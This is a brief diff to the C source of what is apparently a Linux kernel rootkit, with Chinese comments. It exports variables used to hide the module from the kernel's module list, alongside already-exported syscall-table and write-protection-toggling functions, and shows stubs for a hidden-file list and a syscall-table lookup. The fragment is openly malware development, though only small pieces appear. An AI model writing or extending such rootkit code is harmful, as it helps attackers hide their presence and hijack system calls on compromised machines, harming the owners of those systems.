@@ -8,8 +8,8 @@
 #include "rootkit.h"
 
 // 全局变量
-static struct list_head *module_previous;
-static short module_hidden = 0;
+struct list_head *module_previous;
+short module_hidden = 0;
 static struct proc_dir_entry *proc_entry;
 
 // 隐藏的文件列表
@@ -70,6 +70,8 @@ unsigned long *sys_call_table;
 EXPORT_SYMBOL(sys_call_table);
 EXPORT_SYMBOL(disable_write_protection);
 EXPORT_SYMBOL(enable_write_protection);
+EXPORT_SYMBOL(module_previous);
+EXPORT_SYMBOL(module_hidden);
 
 // 查找系统调用表
 static unsigned long *find_sys_call_table(void) {
